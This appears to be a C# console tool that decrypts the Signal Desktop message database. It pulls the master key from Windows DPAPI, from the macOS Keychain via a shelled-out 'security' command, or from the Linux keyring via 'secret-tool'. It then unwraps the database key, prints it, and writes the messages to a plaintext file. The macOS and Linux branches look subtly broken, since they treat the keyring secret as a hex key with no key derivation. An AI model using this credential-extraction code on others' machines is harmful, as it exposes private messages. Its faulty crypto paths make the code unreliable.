using System;
using System.IO;
using System.Text;
using System.Text.Json;
using System.Security.Cryptography;
using System.Data.SQLite;
using System.Runtime.InteropServices;
using System.Diagnostics;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;

namespace SignalDecryptorCrossPlatform
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("==================================================");
            Console.WriteLine("Signal Desktop Database Decryptor (Cross-Platform)");
            Console.WriteLine("==================================================");

            try
            {
                // Step 1: Get Master Key using OS-specific logic
                byte[] masterKey = GetMasterKey();

                // Step 2: Get Wrapped DB Key (this part is cross-platform)
                byte[] wrappedDbKey = GetWrappedDbKey();

                // Step 3: Decrypt Final DB Key using AES-GCM
                string finalKey = DecryptDbKey(masterKey, wrappedDbKey);

                // Step 4: Export the database
                ExportDecryptedDatabase(finalKey);

                Console.WriteLine("\n----------------------------------------");
                Console.WriteLine("DECRYPTION COMPLETE!");
                Console.WriteLine("A decrypted file named 'decrypted_database.sqlite' has been saved to your Desktop.");
                Console.WriteLine("----------------------------------------");
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"\nAn error occurred: {ex.Message}");
                Console.WriteLine("Please ensure Signal is installed and you are running this as the correct user.");
                Console.ResetColor();
            }

            Console.WriteLine("\nPress Enter to exit.");
            Console.ReadLine();
        }

        #region OS-Specific Logic

        public static byte[] GetMasterKey()
        {
            Console.WriteLine("-> Detecting Operating System...");
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                Console.WriteLine("   OS: Windows");
                return GetMasterKey_Windows();
            }
            if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
            {
                Console.WriteLine("   OS: macOS");
                return GetMasterKey_macOS();
            }
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
            {
                Console.WriteLine("   OS: Linux");
                return GetMasterKey_Linux();
            }
            throw new PlatformNotSupportedException("Your operating system is not supported.");
        }

        private static byte[] GetMasterKey_Windows()
        {
            Console.WriteLine("-> Finding and decrypting master key using DPAPI...");
            string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Signal", "Local State");
            string json = File.ReadAllText(localStatePath);
            
            using (JsonDocument doc = JsonDocument.Parse(json))
            {
                string b64Key = doc.RootElement.GetProperty("os_crypt").GetProperty("encrypted_key").GetString();
                byte[] encryptedKeyWithPrefix = Convert.FromBase64String(b64Key);
                byte[] encryptedKey = new byte[encryptedKeyWithPrefix.Length - 5];
                Array.Copy(encryptedKeyWithPrefix, 5, encryptedKey, 0, encryptedKey.Length);
                byte[] masterKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
                Console.WriteLine("   [SUCCESS] Master key decrypted.");
                return masterKey;
            }
        }

        private static byte[] GetMasterKey_macOS()
        {
            Console.WriteLine("-> Finding and decrypting master key using macOS Keychain...");
            // On macOS, the key is stored in the Keychain under the service "Signal Safe Storage"
            // We can retrieve it using the built-in 'security' command-line tool.
            string service = "Signal Safe Storage";
            string account = "Signal";
            string command = $"security find-generic-password -w -s \"{service}\" -a \"{account}\"";
            
            var process = new Process()
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "/bin/bash",
                    Arguments = $"-c \"{command}\"",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                }
            };

            process.Start();
            string masterKeyHex = process.StandardOutput.ReadToEnd().Trim();
            process.WaitForExit();

            if (string.IsNullOrEmpty(masterKeyHex) || process.ExitCode != 0)
            {
                throw new CryptographicException("Failed to retrieve master key from macOS Keychain. Make sure Signal is installed correctly.");
            }

            Console.WriteLine("   [SUCCESS] Master key retrieved from Keychain.");
            // The key from the keychain is often in hex format, convert it to bytes
             return Convert.FromHexString(masterKeyHex);
        }

        private static byte[] GetMasterKey_Linux()
        {
            Console.WriteLine("-> Finding and decrypting master key using Linux Secret Service...");
            // On Linux, the key is stored using the Secret Service API (e.g., GNOME Keyring)
            // We can retrieve it using the 'secret-tool' command-line utility.
            string command = "secret-tool lookup application signal";

            var process = new Process()
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "/bin/bash",
                    Arguments = $"-c \"{command}\"",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                }
            };
            
            process.Start();
            string masterKeyHex = process.StandardOutput.ReadToEnd().Trim();
            process.WaitForExit();

            if (string.IsNullOrEmpty(masterKeyHex) || process.ExitCode != 0)
            {
                throw new CryptographicException("Failed to retrieve master key from Linux Secret Service. Ensure 'secret-tool' is installed and your keyring is unlocked.");
            }

            Console.WriteLine("   [SUCCESS] Master key retrieved from Secret Service.");
             return Convert.FromHexString(masterKeyHex);
        }

        #endregion

        #region Cross-Platform Decryption Logic

        public static byte[] GetWrappedDbKey()
        {
            Console.WriteLine("-> Finding wrapped database key...");
            string configPath = GetSignalConfigPath();
            string json = File.ReadAllText(configPath);

            using (JsonDocument doc = JsonDocument.Parse(json))
            {
                string hexKey = doc.RootElement.GetProperty("encryptedKey").GetString();
                byte[] wrappedKey = Convert.FromHexString(hexKey);
                Console.WriteLine("   [SUCCESS] Found and decoded wrapped key from config.json.");
                return wrappedKey;
            }
        }
        
        public static string DecryptDbKey(byte[] masterKey, byte[] wrappedKey)
        {
            Console.WriteLine("-> Decrypting final database key with AES-256-GCM...");
            // Structure: v10/v11 (3 bytes) + nonce (12 bytes) + ciphertext + tag (16 bytes)
            byte[] nonce = new byte[12];
            Array.Copy(wrappedKey, 3, nonce, 0, 12);

            byte[] ciphertextWithTag = new byte[wrappedKey.Length - 15];
            Array.Copy(wrappedKey, 15, ciphertextWithTag, 0, ciphertextWithTag.Length);

            var cipher = new GcmBlockCipher(new AesEngine());
            var parameters = new AeadParameters(new KeyParameter(masterKey), 128, nonce); // 128 bit tag
            cipher.Init(false, parameters);

            byte[] decryptedBytes = new byte[cipher.GetOutputSize(ciphertextWithTag.Length)];
            int len = cipher.ProcessBytes(ciphertextWithTag, 0, ciphertextWithTag.Length, decryptedBytes, 0);
            cipher.DoFinal(decryptedBytes, len);

            string finalKeyHex = Encoding.UTF8.GetString(decryptedBytes);
            Console.WriteLine("   [SUCCESS] Final database key decrypted.");
            Console.WriteLine($"   Final Key (Hex): {finalKeyHex}");
            return $"0x{finalKeyHex}";
        }

        public static void ExportDecryptedDatabase(string finalKey)
        {
            Console.WriteLine("-> Exporting the decrypted database...");
            string dbPath = Path.Combine(Path.GetDirectoryName(GetSignalConfigPath()), "db.sqlite");
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string decryptedDbPath = Path.Combine(desktopPath, "decrypted_database.sqlite");

            using (var conn = new SQLiteConnection($"Data Source={dbPath}"))
            {
                conn.Open();
                var keyCommand = conn.CreateCommand();
                keyCommand.CommandText = $"PRAGMA key = \"{finalKey}\";";
                keyCommand.ExecuteNonQuery();

                var exportCommand = conn.CreateCommand();
                exportCommand.CommandText = $"ATTACH DATABASE '{decryptedDbPath.Replace('\\', '/')}' AS plaintext KEY ''; SELECT sqlcipher_export('plaintext'); DETACH DATABASE plaintext;";
                exportCommand.ExecuteNonQuery();
            }
            Console.WriteLine("   [SUCCESS] Database exported to your Desktop.");
        }

        #endregion

        #region Helper Functions

        public static string GetSignalConfigPath()
        {
            string configDir;
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                configDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Signal");
            }
            else if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
            {
                configDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Library", "Application Support", "Signal");
            }
            else // Linux
            {
                configDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".config", "Signal");
            }
            return Path.Combine(configDir, "config.json");
        }
        
        // Helper for C# versions before .NET 5 that don't have Convert.FromHexString
        public static byte[] ConvertFromHexString(string hex)
        {
            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < hex.Length; i += 2)
            {
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            }
            return bytes;
        }
        
        #endregion
    }
}